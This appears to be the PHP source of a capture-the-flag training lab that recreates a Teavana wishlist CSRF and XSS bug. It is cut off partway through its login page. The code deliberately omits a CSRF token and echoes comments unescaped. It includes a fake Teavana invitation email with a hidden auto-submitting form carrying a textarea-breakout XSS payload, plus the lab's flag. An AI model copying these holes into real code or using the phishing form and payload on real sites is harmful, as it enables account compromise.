<?php
// Lab 1304 — Teavana CSRF + Reflected/Stored XSS via Wishlist Comment (HackerOne #177508)
// Vulnerability: POST /tea/on/demandware.store/.../Wishlist-Comments/{id} has NO CSRF token
// and the wishlistComment value is reflected raw inside <textarea> — no htmlspecialchars().
// CSRF elevates a Self-XSS into a Reflected XSS on the victim's account.
// Reporter: faisalahmed | Severity: Medium | Bounty: $375 | Platform: Teavana (Starbucks)
// Flag: flag{teavana_csrf_xss_wishlist_no_token_177508}

session_start();

$db = new mysqli('localhost', 'root', '', 'VexiumCTF_DB');
if ($db->connect_error) {
    die('<h3 style="padding:32px;font-family:sans-serif;color:#c00">DB error: ' . htmlspecialchars($db->connect_error) . '</h3>');
}

$scheme   = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$host     = $scheme . '://' . $_SERVER['HTTP_HOST'];
$loginUrl  = $host . '/index.php';
$wishUrl   = $host . '/index.php?action=wishlist';
$logoutUrl = $host . '/index.php?logout=1';
$attackUrl = $host . '/index.php?attack=1';

define('LAB_FLAG', 'flag{teavana_csrf_xss_wishlist_no_token_177508}');

// ── Tables ────────────────────────────────────────────────────────────────────
$db->query("CREATE TABLE IF NOT EXISTS lab1304_users (
    id         INT AUTO_INCREMENT PRIMARY KEY,
    email      VARCHAR(255) NOT NULL UNIQUE,
    password   VARCHAR(255) NOT NULL,
    username   VARCHAR(100) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)");

$db->query("CREATE TABLE IF NOT EXISTS lab1304_wishlist_items (
    id           VARCHAR(20) PRIMARY KEY,
    user_id      INT NOT NULL,
    product_name VARCHAR(255) NOT NULL,
    price        VARCHAR(20) NOT NULL,
    emoji        VARCHAR(10) NOT NULL DEFAULT '🍵',
    weight       VARCHAR(30) NOT NULL DEFAULT '2 oz',
    added_at     TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)");

$db->query("CREATE TABLE IF NOT EXISTS lab1304_comments (
    id              INT AUTO_INCREMENT PRIMARY KEY,
    wishlist_item_id VARCHAR(20) NOT NULL,
    user_id         INT NOT NULL,
    comment_text    TEXT NOT NULL,
    updated_at      TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
)");

// ── Seed ──────────────────────────────────────────────────────────────────────
$sc = $db->query("SELECT COUNT(*) FROM lab1304_users WHERE email IN ('emma@teavana.com','james@teavana.com','aria@teavana.com')")->fetch_row()[0];
if ($sc < 3) {
    $h1 = password_hash('emma@123',  PASSWORD_BCRYPT);
    $h2 = password_hash('james@123', PASSWORD_BCRYPT);
    $h3 = password_hash('aria@123',  PASSWORD_BCRYPT);
    $db->query("INSERT IGNORE INTO lab1304_users (email, password, username) VALUES
        ('emma@teavana.com',  '$h1', 'emma_sips'),
        ('james@teavana.com', '$h2', 'james_brews'),
        ('aria@teavana.com',  '$h3', 'aria_steeps')");
}
$users = $db->query("SELECT id FROM lab1304_users ORDER BY id ASC");
$wishlistItems = [
    "('C1005285074', {uid}, 'Emperor''s Clouds & Mist Green Tea', '\$16.98', '🍃', '2 oz tin')",
    "('C1008923411', {uid}, 'Youthberry White Tea Blend', '\$14.98', '🌸', '2 oz tin')",
    "('C1003847205', {uid}, 'Peach Tranquility Herbal Tea', '\$12.98', '🍑', '2 oz tin')"
];
if ($users) {
    while ($u = $users->fetch_assoc()) {
        $uid = (int)$u['id'];
        $check = $db->query("SELECT COUNT(*) FROM lab1304_wishlist_items WHERE user_id=$uid")->fetch_row()[0];
        if ($check == 0) {
            $vals = array_map(function($v) use ($uid) { return str_replace('{uid}', $uid, $v); }, $wishlistItems);
            $db->query("INSERT INTO lab1304_wishlist_items (id, user_id, product_name, price, emoji, weight) VALUES " . implode(',', $vals));
        }
    }
}

function esc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

// ── Route detection ───────────────────────────────────────────────────────────
$isLogout = isset($_GET['logout']);
$isAttack = isset($_GET['attack']);
$isEdit   = ($_GET['action'] ?? '') === 'edit';
$isComment = ($_GET['action'] ?? '') === 'comment';
$wid      = preg_replace('/[^A-Za-z0-9]/', '', $_GET['wid'] ?? '');
$error    = '';

// ── Logout ────────────────────────────────────────────────────────────────────
if ($isLogout) { session_destroy(); header('Location: ' . $loginUrl); exit; }

// ── Load session user ─────────────────────────────────────────────────────────
$currentUser = null;
if (!empty($_SESSION['lab1304_uid'])) {
    $st = $db->prepare("SELECT * FROM lab1304_users WHERE id = ?");
    $st->bind_param('i', $_SESSION['lab1304_uid']);
    $st->execute();
    $currentUser = $st->get_result()->fetch_assoc();
    $st->close();
}

// ── POST /tea/on/demandware.store/.../Wishlist-Comments/{id}
// ── VULNERABLE: no CSRF token check, comment reflected raw in response ────────
if ($isComment && $_SERVER['REQUEST_METHOD'] === 'POST') {
    // ⚠ No CSRF token check at all — that's the bug
    $rawComment = $_POST['wishlistComment'] ?? '';

    if ($currentUser && $wid) {
        // Upsert comment (store raw, no sanitization)
        $uid = $currentUser['id'];
        $st = $db->prepare("SELECT id FROM lab1304_comments WHERE wishlist_item_id = ? AND user_id = ?");
        $st->bind_param('si', $wid, $uid);
        $st->execute();
        $existing = $st->get_result()->fetch_assoc();
        $st->close();
        if ($existing) {
            $st = $db->prepare("UPDATE lab1304_comments SET comment_text = ? WHERE wishlist_item_id = ? AND user_id = ?");
            $st->bind_param('ssi', $rawComment, $wid, $uid);
        } else {
            $st = $db->prepare("INSERT INTO lab1304_comments (wishlist_item_id, user_id, comment_text) VALUES (?,?,?)");
            $st->bind_param('sis', $wid, $uid, $rawComment);
        }
        $st->execute();
        $st->close();
    }

    // Reflect raw comment in response — this is the XSS sink
    // (browser navigates to this response when CSRF form submits)
    $editUrl = $host . '/index.php?action=edit&wid=' . $wid;
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Comment Saved — Teavana</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;background:#F8F6F1;min-height:100vh;}
.tv-topbar{background:#2D4A1E;height:52px;display:flex;align-items:center;padding:0 24px;gap:10px;}
.tv-logo-text{font-size:1.2rem;font-weight:800;color:#fff;letter-spacing:.04em;font-style:italic;}
.tv-wrap{max-width:640px;margin:60px auto;padding:0 20px;}
.tv-card{background:#fff;border-radius:6px;border:1px solid #ddd;padding:28px;}
.tv-card-title{font-size:.85rem;font-weight:700;color:#2D4A1E;text-transform:uppercase;letter-spacing:.06em;margin-bottom:16px;}
.tv-success{background:#f0f7eb;border:1px solid #b8d9a0;border-radius:4px;padding:12px 16px;font-size:.84rem;color:#2D4A1E;margin-bottom:20px;font-weight:600;}
.tv-textarea{width:100%;border:1px solid #ccc;border-radius:4px;padding:10px;font-size:.84rem;font-family:inherit;resize:vertical;background:#fafafa;color:#333;}
.tv-back{display:inline-block;margin-top:16px;background:#507A2E;color:#fff;text-decoration:none;border-radius:4px;padding:9px 18px;font-size:.82rem;font-weight:700;}
</style>
</head>
<body>
<header class="tv-topbar">
  <span style="font-size:1.4rem;">🍃</span>
  <span class="tv-logo-text">teavana</span>
</header>
<div class="tv-wrap">
  <div class="tv-card">
    <div class="tv-card-title">Wishlist Comment</div>
    <div class="tv-success">✓ Your comment is saved.</div>
    <p style="font-size:.78rem;color:#666;margin-bottom:8px;">Your comment:</p>
    <!-- ⚠ VULNERABLE: wishlistComment is reflected raw — no htmlspecialchars().
         </textarea><img src=x onerror=...> breaks out of the textarea and fires XSS. -->
    <textarea class="tv-textarea" maxlength="150" onkeyup="return ismaxlength(this);" id="wishlistComment" name="wishlistComment" cols="60" rows="12"><?= $rawComment ?></textarea>
    <br>
    <a href="<?= esc($editUrl) ?>" class="tv-back">← Back to Edit Comment</a>
  </div>
</div>
</body>
</html>
    <?php
    exit;
}

// ── POST: Login ───────────────────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isComment && !$isAttack) {
    $email = trim($_POST['email'] ?? '');
    $pwd   = $_POST['password'] ?? '';
    if ($email && $pwd) {
        $st = $db->prepare("SELECT * FROM lab1304_users WHERE email = ?");
        $st->bind_param('s', $email);
        $st->execute();
        $row = $st->get_result()->fetch_assoc();
        $st->close();
        if ($row && password_verify($pwd, $row['password'])) {
            session_regenerate_id(true);
            $_SESSION['lab1304_uid'] = $row['id'];
            header('Location: ' . $wishUrl);
            exit;
        }
        $error = 'Invalid email or password.';
    } else {
        $error = 'Email and password are required.';
    }
}

// ── Redirect logged-in user from login ───────────────────────────────────────
$action = $_GET['action'] ?? '';
if ($currentUser && !$isEdit && !$isAttack && !$isComment && !$action) {
    header('Location: ' . $wishUrl);
    exit;
}

// ── Load wishlist items ───────────────────────────────────────────────────────
$wishlistItems = [];
if ($currentUser) {
    $st = $db->prepare("SELECT w.*, c.comment_text FROM lab1304_wishlist_items w
        LEFT JOIN lab1304_comments c ON c.wishlist_item_id = w.id AND c.user_id = ?
        WHERE w.user_id = ? ORDER BY w.added_at");
    $st->bind_param('ii', $currentUser['id'], $currentUser['id']);
    $st->execute();
    $wishlistItems = $st->get_result()->fetch_all(MYSQLI_ASSOC);
    $st->close();
}

// ── Load single item for edit page ───────────────────────────────────────────
$editItem = null;
$editComment = '';
if ($isEdit && $currentUser && $wid) {
    $st = $db->prepare("SELECT w.*, c.comment_text FROM lab1304_wishlist_items w
        LEFT JOIN lab1304_comments c ON c.wishlist_item_id = w.id AND c.user_id = ?
        WHERE w.id = ? AND w.user_id = ?");
    $st->bind_param('isi', $currentUser['id'], $wid, $currentUser['id']);
    $st->execute();
    $editItem = $st->get_result()->fetch_assoc();
    $st->close();
    if ($editItem) $editComment = $editItem['comment_text'] ?? '';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<?php if ($isAttack): ?>
<title>Teavana VIP Tea Tasting — Exclusive Invitation</title>
<?php elseif ($isEdit && $editItem): ?>
<title><?= esc($editItem['product_name']) ?> — Edit Comment | Teavana</title>
<?php elseif ($currentUser): ?>
<title>My Wishlist | Teavana</title>
<?php else: ?>
<title>Sign In | Teavana</title>
<?php endif; ?>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;min-height:100vh;}

/* ══════════════════════════════════
   TEAVANA SHARED CHROME
   ══════════════════════════════════ */
.tv-topbar{background:#2D4A1E;height:52px;display:flex;align-items:center;padding:0 24px;gap:0;position:sticky;top:0;z-index:100;}
.tv-logo{display:flex;align-items:center;gap:8px;text-decoration:none;margin-right:28px;}
.tv-logo-icon{font-size:1.3rem;}
.tv-logo-text{font-size:1.25rem;font-weight:800;color:#fff;letter-spacing:.05em;font-style:italic;}
.tv-nav-link{color:rgba(255,255,255,.75);text-decoration:none;font-size:.8rem;font-weight:600;padding:6px 12px;border-radius:3px;letter-spacing:.03em;text-transform:uppercase;transition:color .12s;}
.tv-nav-link:hover,.tv-nav-link.active{color:#fff;}
.tv-nav-right{margin-left:auto;display:flex;align-items:center;gap:8px;}
.tv-nav-right a{color:rgba(255,255,255,.65);font-size:.76rem;text-decoration:none;padding:5px 10px;border-radius:3px;}
.tv-nav-right a:hover{color:#fff;background:rgba(255,255,255,.08);}
.tv-utility-bar{background:#3D5C2A;height:32px;display:flex;align-items:center;padding:0 24px;gap:20px;}
.tv-utility-link{color:rgba(255,255,255,.65);font-size:.72rem;text-decoration:none;font-weight:500;text-transform:uppercase;letter-spacing:.05em;}
.tv-utility-link:hover{color:#fff;}
.tv-utility-link.active-util{color:#D4B896;border-bottom:2px solid #D4B896;padding-bottom:2px;}

/* ══════════════════════════════════
   WISHLIST PAGE
   ══════════════════════════════════ */
.tv-page-bg{background:#F8F6F1;min-height:calc(100vh - 84px);}
.tv-page-inner{max-width:960px;margin:0 auto;padding:32px 20px;}
.tv-page-h1{font-size:1.5rem;font-weight:800;color:#2D4A1E;margin-bottom:6px;letter-spacing:-.01em;}
.tv-breadcrumb{font-size:.72rem;color:#888;margin-bottom:24px;}
.tv-breadcrumb a{color:#507A2E;text-decoration:none;}
.tv-wishlist-grid{display:flex;flex-direction:column;gap:16px;}
.tv-wl-card{background:#fff;border-radius:6px;border:1px solid #e0dbd3;display:flex;gap:0;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.05);}
.tv-wl-img{width:130px;background:linear-gradient(135deg,#e8f0e0,#c8deb0);display:flex;align-items:center;justify-content:center;font-size:3rem;flex-shrink:0;}
.tv-wl-body{flex:1;padding:16px 20px;}
.tv-wl-product{font-size:.95rem;font-weight:800;color:#2D4A1E;margin-bottom:2px;}
.tv-wl-sub{font-size:.72rem;color:#888;margin-bottom:6px;}
.tv-wl-price{font-size:1rem;font-weight:800;color:#2D4A1E;margin-bottom:10px;}
.tv-wl-actions{display:flex;align-items:center;gap:10px;flex-wrap:wrap;}
.tv-btn-green{display:inline-flex;align-items:center;gap:6px;background:#507A2E;color:#fff;border:none;border-radius:3px;padding:7px 14px;font-size:.75rem;font-weight:800;text-transform:uppercase;letter-spacing:.05em;cursor:pointer;font-family:inherit;text-decoration:none;transition:background .12s;}
.tv-btn-green:hover{background:#3D5C22;}
.tv-btn-outline{display:inline-flex;align-items:center;gap:6px;background:transparent;color:#507A2E;border:1.5px solid #507A2E;border-radius:3px;padding:6px 13px;font-size:.75rem;font-weight:800;text-transform:uppercase;letter-spacing:.05em;cursor:pointer;font-family:inherit;text-decoration:none;transition:all .12s;}
.tv-btn-outline:hover{background:#507A2E;color:#fff;}
.tv-wl-comment-preview{margin-top:10px;padding:8px 10px;background:#f5f3ef;border-left:3px solid #507A2E;border-radius:0 3px 3px 0;font-size:.75rem;color:#555;font-style:italic;max-width:380px;word-break:break-word;}
.tv-wl-comment-label{font-size:.65rem;font-weight:700;color:#507A2E;text-transform:uppercase;letter-spacing:.05em;margin-bottom:2px;}
.tv-wl-right{padding:16px;display:flex;flex-direction:column;gap:8px;border-left:1px solid #ede9e2;min-width:120px;align-items:center;justify-content:center;}
.tv-remove{font-size:.7rem;color:#c0392b;text-decoration:none;font-weight:600;}
.tv-remove:hover{text-decoration:underline;}

/* ══════════════════════════════════
   EDIT COMMENT PAGE
   ══════════════════════════════════ */
.tv-edit-wrap{max-width:680px;margin:40px auto;padding:0 20px;}
.tv-edit-card{background:#fff;border:1px solid #e0dbd3;border-radius:6px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.07);}
.tv-edit-card-hdr{background:#2D4A1E;padding:14px 20px;display:flex;align-items:center;gap:10px;}
.tv-edit-card-hdr span{font-size:.85rem;font-weight:700;color:rgba(255,255,255,.9);text-transform:uppercase;letter-spacing:.06em;}
.tv-edit-product-strip{background:#f5f3ef;border-bottom:1px solid #ede9e2;padding:12px 20px;display:flex;align-items:center;gap:14px;}
.tv-edit-product-emoji{font-size:2rem;}
.tv-edit-product-name{font-size:.9rem;font-weight:800;color:#2D4A1E;}
.tv-edit-product-sub{font-size:.7rem;color:#888;margin-top:1px;}
.tv-edit-body{padding:20px;}
.tv-field label{display:block;font-size:.7rem;font-weight:700;color:#2D4A1E;text-transform:uppercase;letter-spacing:.06em;margin-bottom:6px;}
/* ⚠ textarea deliberately has no escaping in the rendered value — XSS sink */
.tv-field textarea{width:100%;border:1px solid #ccc;border-radius:4px;padding:10px;font-size:.84rem;font-family:inherit;resize:vertical;color:#333;line-height:1.5;}
.tv-field textarea:focus{outline:none;border-color:#507A2E;box-shadow:0 0 0 2px rgba(80,122,46,.15);}
.tv-char-count{font-size:.65rem;color:#aaa;text-align:right;margin-top:3px;}
.tv-edit-footer{display:flex;align-items:center;gap:10px;padding:12px 20px;border-top:1px solid #ede9e2;background:#faf9f7;}
.tv-btn-save{background:#507A2E;border:none;border-radius:3px;padding:9px 22px;font-size:.82rem;font-weight:800;color:#fff;cursor:pointer;font-family:inherit;text-transform:uppercase;letter-spacing:.05em;}
.tv-btn-save:hover{background:#3D5C22;}
.tv-btn-cancel{background:transparent;border:1.5px solid #ccc;border-radius:3px;padding:8px 16px;font-size:.8rem;font-weight:600;color:#777;cursor:pointer;font-family:inherit;text-decoration:none;}
.tv-btn-cancel:hover{border-color:#999;color:#333;}
.tv-char-limit{font-size:.68rem;color:#aaa;margin-left:auto;}

/* ── Flag reveal banner (hidden until XSS fires) ── */
.tv-flag-reveal{display:none;background:#2D4A1E;color:#fff;padding:16px 20px;border-radius:6px;margin-bottom:20px;font-family:'Courier New',monospace;}
.tv-flag-reveal .tv-flag-label{font-size:.6rem;font-weight:700;text-transform:uppercase;letter-spacing:.1em;color:#a8d07a;margin-bottom:6px;}
.tv-flag-reveal .tv-flag-val{font-size:.9rem;font-weight:700;word-break:break-all;}
.tv-xss-note{background:#fff8e8;border:1px solid #f0d080;border-radius:4px;padding:10px 14px;margin-top:12px;font-size:.72rem;color:#7a5c00;line-height:1.5;}

/* ══════════════════════════════════
   LOGIN PAGE
   ══════════════════════════════════ */
.tv-login-bg{background:#F8F6F1;min-height:100vh;display:flex;flex-direction:column;}
.tv-login-body{flex:1;display:flex;align-items:center;justify-content:center;padding:48px 16px;}
.tv-login-wrap{width:100%;max-width:380px;}
.tv-login-card{background:#fff;border:1px solid #ddd;border-radius:6px;padding:32px 28px;box-shadow:0 2px 12px rgba(0,0,0,.08);}
.tv-login-title{font-size:1.05rem;font-weight:800;color:#2D4A1E;text-align:center;margin-bottom:22px;letter-spacing:-.01em;}
.tv-field{margin-bottom:14px;}
.tv-field label{display:block;font-size:.72rem;font-weight:700;color:#555;text-transform:uppercase;letter-spacing:.06em;margin-bottom:5px;}
.tv-field input{width:100%;border:1px solid #ccc;border-radius:4px;padding:9px 11px;font-size:.86rem;color:#333;font-family:inherit;outline:none;transition:border-color .15s;}
.tv-field input:focus{border-color:#507A2E;box-shadow:0 0 0 2px rgba(80,122,46,.12);}
.tv-field input::placeholder{color:#bbb;}
.tv-login-submit{width:100%;background:#507A2E;border:none;border-radius:3px;padding:10px;font-size:.88rem;font-weight:800;color:#fff;cursor:pointer;font-family:inherit;text-transform:uppercase;letter-spacing:.05em;margin-top:6px;transition:background .15s;}
.tv-login-submit:hover{background:#3D5C22;}
.tv-login-or{display:flex;align-items:center;gap:10px;margin:14px 0;color:#ccc;font-size:.72rem;}
.tv-login-or::before,.tv-login-or::after{content:'';flex:1;height:1px;background:#eee;}
.tv-error-banner{background:#fef2f2;border:1px solid #fca5a5;border-radius:4px;padding:10px 14px;font-size:.78rem;color:#b91c1c;margin-bottom:16px;}
.tv-login-sub{text-align:center;margin-top:14px;font-size:.74rem;color:#888;}
.tv-login-sub a{color:#507A2E;text-decoration:none;font-weight:700;}

/* ══════════════════════════════════
   ATTACK PAGE — Fake VIP Email
   ══════════════════════════════════ */
.atk-bg{background:#F8F6F1;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:40px 16px;}
.atk-email{background:#fff;border-radius:8px;max-width:560px;width:100%;box-shadow:0 4px 24px rgba(0,0,0,.12);overflow:hidden;}
.atk-hdr{background:#2D4A1E;padding:18px 24px;display:flex;align-items:center;gap:10px;}
.atk-hdr-logo{font-size:1.1rem;font-weight:800;color:#fff;font-style:italic;letter-spacing:.04em;}
.atk-hdr-sub{font-size:.68rem;color:rgba(255,255,255,.5);margin-left:auto;}
.atk-badge{display:inline-block;background:#D4B896;color:#2D4A1E;font-size:.65rem;font-weight:800;text-transform:uppercase;letter-spacing:.08em;border-radius:2px;padding:3px 8px;margin-bottom:16px;}
.atk-body{padding:30px 28px 24px;}
.atk-greeting{font-size:.98rem;font-weight:800;color:#2D4A1E;margin-bottom:10px;}
.atk-text{font-size:.84rem;color:#444;line-height:1.7;margin-bottom:14px;}
.atk-highlight-box{background:linear-gradient(135deg,#f0f7e8,#e8f2d8);border:1px solid #c0d8a0;border-radius:6px;padding:16px 18px;margin-bottom:20px;text-align:center;}
.atk-highlight-box .atk-event-title{font-size:1rem;font-weight:800;color:#2D4A1E;margin-bottom:4px;}
.atk-highlight-box .atk-event-sub{font-size:.78rem;color:#507A2E;font-weight:600;}
.atk-cta-btn{display:inline-block;background:#507A2E;color:#fff;text-decoration:none;border-radius:3px;padding:12px 28px;font-size:.9rem;font-weight:800;border:none;cursor:pointer;font-family:inherit;text-transform:uppercase;letter-spacing:.05em;transition:background .15s;}
.atk-cta-btn:hover{background:#3D5C22;}
.atk-divider{height:1px;background:#eee;margin:20px 0;}
.atk-footer-text{font-size:.68rem;color:#aaa;line-height:1.6;}
.atk-footer-links a{color:#507A2E;text-decoration:none;}
.atk-email-meta{background:#f5f3ef;border-top:1px solid #eee;padding:10px 24px;display:flex;justify-content:space-between;font-size:.65rem;color:#aaa;}
.atk-loading{display:none;text-align:center;color:#777;font-size:.82rem;padding:12px 0;}
</style>
</head>
<body>

<?php if ($isAttack): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     ATTACK PAGE — Fake Teavana VIP Tea Tasting Invitation
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="atk-bg">
  <div class="atk-email">
    <div class="atk-hdr">
      <span style="font-size:1.3rem;">🍃</span>
      <span class="atk-hdr-logo">teavana</span>
      <span class="atk-hdr-sub">invitations@teavana.com</span>
    </div>
    <div class="atk-body">
      <div class="atk-badge">⭐ VIP Invitation</div>
      <div class="atk-greeting">You're Invited, tea_lover_2016!</div>
      <p class="atk-text">
        As one of our most valued wishlist members, we'd like to invite you to an
        <strong>exclusive VIP Tea Tasting Experience</strong> — complimentary, by reservation only.
        Your fellow tea enthusiasts have left notes about this event on your wishlist.
        Click below to view the comments and confirm your spot!
      </p>
      <div class="atk-highlight-box">
        <div class="atk-event-title">🍵 Teavana Spring Harvest Tasting</div>
        <div class="atk-event-sub">Saturday, November 5, 2016 · Starbucks Reserve Roastery</div>
      </div>

      <!-- ⚠ CSRF: POST form targets /tea/on/demandware.store/.../Wishlist-Comments/C1005285074
           with XSS payload as wishlistComment. NO CSRF token in the form.
           Server reflects the comment raw → XSS fires in the victim's browser. -->
      <form id="csrfForm"
            action="/index.php?action=comment&wid=C1005285074"
            method="POST"
            style="display:none;">
        <input type="hidden" name="wishlistComment" value="</textarea><img src=x onerror=document.getElementById('flag-reveal').style.display='block'>">
      </form>

      <div style="text-align:center;">
        <button class="atk-cta-btn" id="csrfBtn" onclick="fireCSRF()">
          View Wishlist Comments & RSVP →
        </button>
      </div>
      <div class="atk-loading" id="loadingMsg">⏳ Loading your wishlist…</div>

      <div class="atk-divider"></div>
      <p class="atk-footer-text">
        You are receiving this invitation because you are a registered Teavana wishlist member.<br>
        <a href="#">Unsubscribe</a> · <a href="#">Privacy Policy</a> · <a href="#">Help Center</a>
      </p>
    </div>
    <div class="atk-email-meta">
      <span>Teavana, Inc. · teavana.com</span>
      <span>Oct 22, 2016, 10:40 AM UTC</span>
    </div>
  </div>
</div>

<script>
function fireCSRF() {
    document.getElementById('csrfBtn').style.display = 'none';
    document.getElementById('loadingMsg').style.display = 'block';
    // Small delay so student sees the loading state, then form submits
    setTimeout(function() { document.getElementById('csrfForm').submit(); }, 600);
}
</script>

<?php elseif ($isEdit && $currentUser): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     EDIT COMMENT PAGE — XSS sink: textarea reflects raw comment
     ══════════════════════════════════════════════════════════════════════════ -->
<header class="tv-topbar">
  <a href="/index.php?action=wishlist" class="tv-logo">
    <span class="tv-logo-icon">🍃</span>
    <span class="tv-logo-text">teavana</span>
  </a>
  <a href="#" class="tv-nav-link">Tea</a>
  <a href="#" class="tv-nav-link">Teavana Craft Beer</a>
  <a href="#" class="tv-nav-link">Gifts</a>
  <div class="tv-nav-right">
    <a href="#">Hello, <?= esc($currentUser['username']) ?></a>
    <a href="/index.php?action=wishlist">My Wishlist</a>
    <a href="/index.php?logout=1">Sign Out</a>
  </div>
</header>
<div class="tv-utility-bar">
  <a href="#" class="tv-utility-link">My Account</a>
  <a href="#" class="tv-utility-link">Order History</a>
  <a href="/index.php?action=wishlist" class="tv-utility-link active-util">My Wishlist</a>
  <a href="#" class="tv-utility-link">Gift Registry</a>
</div>

<div style="background:#F8F6F1;min-height:calc(100vh - 84px);padding:32px 0;">
  <div class="tv-edit-wrap">

    <!-- ⚠ Hidden flag div — becomes visible when XSS fires (onerror handler targets this id) -->
    <div id="flag-reveal" class="tv-flag-reveal">
      <div class="tv-flag-label">🚨 XSS Executed — Flag Captured</div>
      <div class="tv-flag-val"><?= LAB_FLAG ?></div>
    </div>

    <div class="tv-edit-card">
      <div class="tv-edit-card-hdr">
        <span>📝</span>
        <span>Edit Wishlist Comment</span>
      </div>
      <?php if ($editItem): ?>
      <div class="tv-edit-product-strip">
        <span class="tv-edit-product-emoji"><?= esc($editItem['emoji']) ?></span>
        <div>
          <div class="tv-edit-product-name"><?= esc($editItem['product_name']) ?></div>
          <div class="tv-edit-product-sub"><?= esc($editItem['weight']) ?> · <?= esc($editItem['price']) ?></div>
        </div>
      </div>
      <?php endif; ?>
      <div class="tv-edit-body">
        <!-- ⚠ VULNERABLE: comment_text is echoed raw — no htmlspecialchars().
             Payload </textarea><img src=x onerror=...> escapes the textarea and fires XSS. -->
        <form method="POST"
              action="/index.php?action=comment&wid=<?= esc($wid) ?>">
          <div class="tv-field">
            <label>Your Comment <span style="color:#ccc;font-weight:400;text-transform:none;">(max 150 chars)</span></label>
            <textarea
              maxlength="150"
              onkeyup="return ismaxlength(this);"
              id="wishlistComment"
              name="wishlistComment"
              rows="8"><?= $editComment ?></textarea>
            <div class="tv-char-count"><span id="charCount"><?= strlen($editComment) ?></span> / 150</div>
          </div>
          <div class="tv-xss-note" id="xssHint" style="display:none;"></div>
        </form>
      </div>
      <div class="tv-edit-footer">
        <button type="submit" form="editForm" class="tv-btn-save" onclick="document.querySelector('form').submit()">Save Comment</button>
        <a href="/index.php?action=wishlist" class="tv-btn-cancel">Cancel</a>
        <span class="tv-char-limit">No CSRF token in this form</span>
      </div>
    </div>

    <div style="margin-top:10px;font-size:.7rem;color:#aaa;text-align:center;">
      Teavana.com · <a href="#" style="color:#507A2E;">My Account</a> · Wishlist
    </div>
  </div>
</div>

<script>
var ta = document.getElementById('wishlistComment');
if (ta) {
    ta.addEventListener('input', function() {
        document.getElementById('charCount').textContent = this.value.length;
    });
}
</script>

<?php elseif ($currentUser): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     WISHLIST PAGE
     ══════════════════════════════════════════════════════════════════════════ -->
<header class="tv-topbar">
  <a href="/index.php?action=wishlist" class="tv-logo">
    <span class="tv-logo-icon">🍃</span>
    <span class="tv-logo-text">teavana</span>
  </a>
  <a href="#" class="tv-nav-link">Tea</a>
  <a href="#" class="tv-nav-link">Teavana Craft Beer</a>
  <a href="#" class="tv-nav-link">Gifts</a>
  <div class="tv-nav-right">
    <a href="#">Hello, <?= esc($currentUser['username']) ?></a>
    <a href="/index.php?action=wishlist">My Wishlist ❤</a>
    <a href="/index.php?logout=1">Sign Out</a>
  </div>
</header>
<div class="tv-utility-bar">
  <a href="#" class="tv-utility-link">My Account</a>
  <a href="#" class="tv-utility-link">Order History</a>
  <a href="/index.php?action=wishlist" class="tv-utility-link active-util">My Wishlist</a>
  <a href="#" class="tv-utility-link">Gift Registry</a>
</div>

<div class="tv-page-bg">
  <div class="tv-page-inner">
    <div class="tv-breadcrumb"><a href="#">Home</a> › <a href="#">My Account</a> › My Wishlist</div>
    <div class="tv-page-h1">My Wishlist</div>
    <p style="font-size:.8rem;color:#888;margin-bottom:24px;"><?= count($wishlistItems) ?> items saved</p>

    <div class="tv-wishlist-grid">
    <?php foreach ($wishlistItems as $item):
      $commentText = $item['comment_text'] ?? '';
      $editUrl = '/index.php?action=edit&wid=' . $item['id'];
    ?>
      <div class="tv-wl-card">
        <div class="tv-wl-img"><?= esc($item['emoji']) ?></div>
        <div class="tv-wl-body">
          <div class="tv-wl-product"><?= esc($item['product_name']) ?></div>
          <div class="tv-wl-sub"><?= esc($item['weight']) ?></div>
          <div class="tv-wl-price"><?= esc($item['price']) ?></div>
          <div class="tv-wl-actions">
            <a href="#" class="tv-btn-green">Add to Cart</a>
            <a href="<?= esc($editUrl) ?>" class="tv-btn-outline">
              <?= $commentText ? 'Edit Comment' : 'Add Comment' ?>
            </a>
          </div>
          <?php if ($commentText): ?>
          <div class="tv-wl-comment-preview">
            <div class="tv-wl-comment-label">Your Note</div>
            <?= esc($commentText) ?>
          </div>
          <?php endif; ?>
        </div>
        <div class="tv-wl-right">
          <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='60' height='60' viewBox='0 0 60 60'%3E%3Crect width='60' height='60' fill='%23e8f0e0' rx='4'/%3E%3Ctext x='30' y='38' text-anchor='middle' font-size='28'%3E🍵%3C/text%3E%3C/svg%3E"
               alt="" style="width:56px;height:56px;border-radius:4px;margin-bottom:6px;">
          <a href="#" class="tv-remove">Remove</a>
        </div>
      </div>
    <?php endforeach; ?>
    </div>
  </div>
</div>

<?php else: ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     LOGIN PAGE
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="tv-login-bg">
  <header class="tv-topbar">
    <a href="/tea/login" class="tv-logo">
      <span class="tv-logo-icon">🍃</span>
      <span class="tv-logo-text">teavana</span>
    </a>
    <div class="tv-nav-right">
      <a href="#">Find a Store</a>
      <a href="#">Help</a>
    </div>
  </header>
  <div class="tv-login-body">
    <div class="tv-login-wrap">
      <div style="text-align:center;margin-bottom:24px;">
        <div style="font-size:2.5rem;margin-bottom:4px;">🍃</div>
